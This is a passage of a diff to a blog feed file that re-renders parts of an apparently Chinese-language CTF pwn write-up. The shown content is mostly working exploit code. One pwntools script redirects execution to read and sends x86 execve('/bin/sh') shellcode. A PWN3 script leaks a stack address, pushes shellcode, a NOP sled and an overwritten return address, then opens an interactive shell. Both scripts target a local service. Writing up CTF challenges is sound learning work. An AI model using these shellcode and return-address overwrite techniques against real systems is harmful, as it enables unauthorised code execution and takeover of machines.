+</span></span></code></pre></div><p>可以控制<code>read</code>的返回地址跟參數,所以可以把<code>ret</code>跟我們shellcode 指到同一個位置上,shellcode的話隨便找一段空⽩白的地⽅方寫上去就好</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;127.0.0.1&#39;</span>, <span style="color:#ae81ff">4000</span>)
+</span></span><span style="display:flex;"><span>read_adr <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xa0\x83\x04\x08</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>read <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x00\x00\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\xa1\x04\x08</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x01\x00\x00</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">20</span> <span style="color:#f92672">+</span> read_adr <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\xa1\x04\x08</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> read
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>send (p)
+</span></span><span style="display:flex;"><span>time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">5</span>)
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>send (<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd</span>
+</span></span><span style="display:flex;"><span>\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68<span style="color:#e6db74">&#34;)</span>
+</span></span></code></pre></div><h2 id="pwn3">PWN3</h2>
 <p>滿多東西始用 qira看的 pwn3首先可以一直<code>push</code>來達成覆蓋<code>ret</code>的效果最後要exit退出達成覆蓋
 一開始算一下 <code>pop leak</code> 的值跟我們shellcode 差多遠,計算以後差 36 ,但是會覆蓋 ret 所以ret 以後要給他一個指標 指向我們的shellcode
 ⽤用<code>%d</code>的話超過<code>0x80000000</code> 要剪掉 <code>0x100000000</code>塞進去的職才會是正常的 我們的payload預計長這樣</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">point to shellcode + shellcode + nop + ret
-</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
-<span style="color:#f92672">import</span> time
-r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;127.0.0.1&#39;</span>,<span style="color:#ae81ff">4000</span>)
-<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">push</span>(num):
-     r<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#39;1</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
-     time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">0.2</span>)
-     <span style="color:#66d9ef">if</span> num <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x80000000</span>:
-           num <span style="color:#f92672">-=</span> <span style="color:#ae81ff">0x100000000</span>
-     r<span style="color:#f92672">.</span>send( str(num) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
-<span style="color:#75715e">#pop leak</span>
-r<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#39;2</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
-item <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvline_contains(<span style="color:#e6db74">&#39;item&#39;</span>)[<span style="color:#ae81ff">13</span>:<span style="color:#ae81ff">23</span>]
-shell_adr <span style="color:#f92672">=</span> int(item,<span style="color:#ae81ff">16</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">36</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>
-<span style="color:#75715e">#shellcode point</span>
-push(shell_adr)
-<span style="color:#75715e">#shellcode</span>
-push(<span style="color:#ae81ff">0x315b0beb</span>)
-push(<span style="color:#ae81ff">0x31c931c0</span>)
-push(<span style="color:#ae81ff">0xcd0bb0d2</span>)
-push(<span style="color:#ae81ff">0xfff0e880</span>)
-push(<span style="color:#ae81ff">0x622fffff</span>)
-push(<span style="color:#ae81ff">0x732f6e69</span>)
-push(<span style="color:#ae81ff">0x90900068</span>)
-<span style="color:#75715e">#nop</span>
-<span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range (<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">16</span>):
-     push(<span style="color:#ae81ff">0x90909090</span>)
-<span style="color:#75715e">#ret</span>
-push(shell_adr)
-<span style="color:#75715e">#exit</span>
-time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">1</span>)
-r<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#39;4</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
-<span style="color:#75715e">#get shell</span>
-r<span style="color:#f92672">.</span>interactive()
-</code></pre></div>]]></content:encoded>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>point to shellcode + shellcode + nop + ret
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;127.0.0.1&#39;</span>,<span style="color:#ae81ff">4000</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">push</span>(num):
+</span></span><span style="display:flex;"><span>     r<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#39;1</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>     time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">0.2</span>)
+</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">if</span> num <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x80000000</span>:
+</span></span><span style="display:flex;"><span>           num <span style="color:#f92672">-=</span> <span style="color:#ae81ff">0x100000000</span>
+</span></span><span style="display:flex;"><span>     r<span style="color:#f92672">.</span>send( str(num) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#pop leak</span>
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#39;2</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>item <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvline_contains(<span style="color:#e6db74">&#39;item&#39;</span>)[<span style="color:#ae81ff">13</span>:<span style="color:#ae81ff">23</span>]
+</span></span><span style="display:flex;"><span>shell_adr <span style="color:#f92672">=</span> int(item,<span style="color:#ae81ff">16</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">36</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#shellcode point</span>
+</span></span><span style="display:flex;"><span>push(shell_adr)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#shellcode</span>
+</span></span><span style="display:flex;"><span>push(<span style="color:#ae81ff">0x315b0beb</span>)
+</span></span><span style="display:flex;"><span>push(<span style="color:#ae81ff">0x31c931c0</span>)
+</span></span><span style="display:flex;"><span>push(<span style="color:#ae81ff">0xcd0bb0d2</span>)
+</span></span><span style="display:flex;"><span>push(<span style="color:#ae81ff">0xfff0e880</span>)
+</span></span><span style="display:flex;"><span>push(<span style="color:#ae81ff">0x622fffff</span>)
+</span></span><span style="display:flex;"><span>push(<span style="color:#ae81ff">0x732f6e69</span>)
+</span></span><span style="display:flex;"><span>push(<span style="color:#ae81ff">0x90900068</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#nop</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range (<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">16</span>):
+</span></span><span style="display:flex;"><span>     push(<span style="color:#ae81ff">0x90909090</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#ret</span>
+</span></span><span style="display:flex;"><span>push(shell_adr)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#exit</span>
+</span></span><span style="display:flex;"><span>time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#39;4</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#get shell</span>
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div>]]></content:encoded>
     </item>
     
   </channel>
